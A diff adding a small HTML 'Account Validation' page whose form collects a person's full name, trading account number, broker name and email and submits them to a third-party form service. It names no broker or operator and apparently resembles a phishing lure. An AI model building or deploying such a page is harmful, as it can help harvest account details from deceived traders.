@@ -1,1 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<title>Account Validation</title>
+
+<style>
+
+body{
+    font-family: Arial, sans-serif;
+    max-width:600px;
+    margin:50px auto;
+    padding:20px;
+}
+
+h1{
+    text-align:center;
+}
+
+form{
+    display:flex;
+    flex-direction:column;
+    gap:15px;
+}
+
+input{
+    padding:12px;
+    font-size:16px;
+}
+
+button{
+    padding:14px;
+    cursor:pointer;
+    font-size:16px;
+}
+
+</style>
+
+</head>
+<body>
+
+<h1>Account Validation</h1>
+
+<form action="https://formspree.io/f/xrewplql" method="POST">
+
+    <input
+        type="text"
+        name="full_name"
+        placeholder="FULL NAME"
+        required>
+
+    <input
+        type="text"
+        name="account_number"
+        placeholder="TRADING ACCOUNT NUMBER"
+        required>
+
+    <input
+        type="text"
+        name="broker_name"
+        placeholder="BROKER NAME"
+        required>
+
+    <input
+        type="email"
+        name="email"
+        placeholder="EMAIL ADDRESS"
+        required>
+
+    <button type="submit">
+        VALIDATE ACCOUNT
+    </button>
+
+</form>
+
+</body>
+</html>
